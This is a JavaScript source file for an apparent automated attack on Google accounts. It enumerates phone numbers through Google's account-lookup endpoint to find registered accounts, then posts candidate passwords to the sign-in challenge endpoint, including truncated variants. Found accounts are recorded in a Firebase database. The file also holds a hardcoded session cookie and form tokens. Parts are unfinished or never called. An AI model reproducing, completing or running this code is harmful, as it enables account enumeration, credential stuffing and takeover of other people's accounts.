const puppeteer = require('puppeteer')
const admin = require('./database')
const request = require('request')
const crypto = require('crypto')
const fs = require('fs')

let SERVER = 'server'
let COUNTRY = null
let CODE = null

let database = new admin()

let mServerData = null
let mSearch = false
let page = null


fs.readFile('./id.txt', {encoding: 'utf-8'}, function(err,data){
    if(!err) {
        SERVER = 'server'+data
        database.connect((error) => {
            if(!error) {
                request({
                    url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
                    json:true
                }, function(error, response, body){
                    if(!error) {
                        CODE = body['code']
                        COUNTRY = body['name']
                        mServerData = body
                        browserStart()
                    }
                })
            }
        })
    } else {
        console.log(err)
    }
})

async function browserStart() {
    ;(async () => {

        let browser = await puppeteer.launch({
            headless: true,
            args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
        })
    
        page = await browser.newPage()
    
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36')
    
        await page.goto('https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings')
    
        for(let key of Object.keys(mServerData)) {
            if(key.startsWith('start')) {
                let runing = 'runing'+key.replace('start', '')
                let start = mServerData[key]
                let number = mServerData[runing]
                if(number == null) {
                    number = start * 1000000
                }
                if(number != 0) {
                    if(key == 'start_1') {
                        checkNumber01(number, runing, start, 0)
                    }
                }
            }
        }
        
    })()
} 


function checkNumber01(number, name, start, runing) {
    runing++
    let temp = runing
    if(temp >= 10) {
        console.log('Check: '+number)
        database.set('/code/server/'+SERVER+'/'+name, number)
        temp = 0
    }
    if(parseInt(start)+1 <= parseInt(number/1000000)) {
        database.set('/code/server/'+SERVER+'/'+name, 0)
    } else {
        request({
            url: 'https://accounts.google.com/_/lookup/accountlookup?hl=en&_reqid=999999',
            method: 'POST',
            body: getNumberTempData(CODE+number),
            headers: {
                'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf' : 1
            }
        }, function(error, responce, body) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][1] == 16) {
                    console.log('Found: '+data[0][4])
                    logInNumber01(number, name, start, temp)
                } else {
                    checkNumber01(number+1, name, start, temp)
                }
            } catch (e) {
                checkNumber01(number+1, name, start, temp)
            }
        })
    }
}


function getNumberTempData(number) {
    let freq = [number,"AEThLlzLnodznP_eS7-mfzAihkXlpSKvoxliHZlPZE7W1-NMXK50YUORqG5WNyxwLONQwZwBsK1p-PH7BHW4s-NEZhzTMrxrdQHlqhB6bpzNema_MyohPW-JaUv-EO7_qbvIYnlKdIu0JkSGy2tJbRiElFWhzHXi1UJK1nt4D8UbHnOux-lF7PC0_RlISAgrI1oOSktxWO1I",[],null,null,null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?service=accountsettings&hl=en-US&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&csig=AF-SEnY7bxxtADWhtFc_%3A1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin",null,[],4,[],"GlifWebSignIn",null,[],false],1,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,true,null,null,null,null,null,null,null,null,[]],number,null,null,null,true,true,[]]
    return 'f.req='+encodeURIComponent(JSON.stringify(freq))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))
}

function getIdentifier() {
    let data = ''
    let loop = Math.floor(Math.random() * 15)+15
    for(let i=0; i<loop; i++) {
        data = data+crypto.randomBytes(20).toString('hex')
    }
    return data
}


async function logInNumber01(number, name, start, runing) {
    ;(async () => {
        let Identifier = await getIdentifierData(CODE+number)
        //let bodyData = getNumberData(CODE+number, Identifier)
    
        console.log(Identifier)
    })()
}

function passwordTry01(password, TL, Token, Identifier, type, loop, number, name, start, runing) {
    let pass = password
    if(loop == 1) {
        pass = password.substring(0, 8)
    } else if(loop == 2) {
        pass = password.substring(password.length-8, password.length)
    }
    request({
        url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+TL+'&_reqid=999999',
        method: 'POST',
        body: getPasswordData(pass, Token, Identifier, type),
        headers: {
            'Cookie': '__Host-GAPS=1:OaDG-LeMTChms8q6vEHndnipIAEGpA:495P5GyXHLy82j8T',
            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf' : 1
        }
    }, function(error, responce, body) {
        let output = 0
        //console.log(body)
        try {
            let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
            if(data[0][3] == 5) {
                console.log('Wrong Password')
                if(password.length > 8) {
                    if(loop == 0) {
                        output = 1
                        passwordTry01(password, TL, Token, Identifier, type, 1, number, name, start, runing)
                    } else if(loop == 1) {
                        output = 1
                        passwordTry01(password, TL, Token, Identifier, type, 2, number, name, start, runing)
                    }
                }
            } else if(data[0][3] == 3 || data[0][3] == 2) {
                let temp = number.toString()
                database.set('/code/gmail/found/'+COUNTRY+'/'+temp.substring(0, 3)+'/'+temp.substring(3, temp.length), loop)
                output = 0
            } else if(data[0][3] == 3) {
                //console.log(body)
                output = 2
            }
        } catch (e) {
            console.log('Error: '+e)
        }

        if(output == 0) {
            checkNumber01(number+1, name, start, runing)
        }
    })
}

function getNumberData(number, identify) {
    return 'f.req='+encodeURIComponent(JSON.stringify([number,"AEThLlxYXUgHvm0QKfHaBSFa1iUK-QC__xrE2hwUDyx7j0B-xIms-W4ozplRZeuNjwjdHtEkYLD1lic_aQSH9TyRkrkHT8nBenB_nsDLCuuACE7kcF5qmO5-a1NAtDkT44R9eFLGIQjc1R7Etsa0BdmO-0evZzuze74QMFLCYjWC9KDeXkIs-IyCg3OcndTv17X5CS1yDiwmuJw8tmoHpPpQ1z8wm6HlHQXLgLEsHMk2xdwD8GwRSdA_huKgHGg9dkbXuWM5ZT1c04_Slvrqx76MrS--r1AAATb_dRh9tux-Ph-0XfBG0PW4h62PCZ7YyfrQM9AKdUebOzZdnZ4g1dUI-tdKMv40hyAEyl0COLL6VO6jeCMNx56DBVOhC21KU2PnFLxl2C-TmjtdDHE7x0IIAEE5IxX4X-bQFaWhDSFgOxMpQmCU4ZFLh2ogGadoitNuXgiFK3RtHCrczUCS3gAU23iQKs484hXbxX7IkOGKE6Ga-Q1uTXnkXm6-Ty-EibxhZZEZ91Ib",[],null,"BD",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?elo=1",null,[],4,[],"GlifWebSignIn",null,[],true],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"428bddb8-2589-43ac-9a53-bf6237b74085",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,true,null,null,null,null,null,null,null,null,[]],number,null,null,null,true,true,[]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
}

function getPasswordData(password, token, identify, type) {
    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify([token,null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
}

function getRecoveryData(gmail, token, identify, type) {
    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify([token,null,5,null,[12,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[gmail]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
}

async function getIdentifierData(number) {
    let responce = null
    while(true) {
        if(!mSearch) {
            mSearch = true
            responce = getIdentifierToken(number)
            if(responce) {
                mSearch = false
                break
            }
        }
    }
    return responce
}

async function getIdentifierToken(number) {
    if(page != null) {
        return await page.evaluate(async (number) => {
            let root = document.querySelector('#Email')
            if(root) {
                root.value = number
                try {
                    return document.bg.low(function(response) {
                        return response
                    })
                } catch (err) {
                    root.value = ''
                }
            }
            return null
        }, number)
    } else {
        return null
    }
}


async function click(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            root.click()
            return true
        } else {
            return false
        }
    }, id)
    return output
}

async function exits(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            return true
        } else {
            return false
        }
    }, id)
    return output
}
